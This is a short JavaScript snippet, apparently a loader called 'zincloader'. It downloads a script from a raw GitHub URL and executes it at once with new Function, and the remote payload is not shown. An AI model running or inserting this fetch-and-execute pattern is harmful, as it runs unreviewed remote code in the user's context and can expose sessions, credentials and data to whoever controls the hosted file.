(async () => {
  const rawUrl = "https://raw.githubusercontent.com/osukaaaa/zincloader/refs/heads/main/hm";

  const response = await fetch(rawUrl);
  if (!response.ok) throw new Error(`Fetch failed: ${response.status}`);

  const script = await response.text();

  new Function(script)();
})();
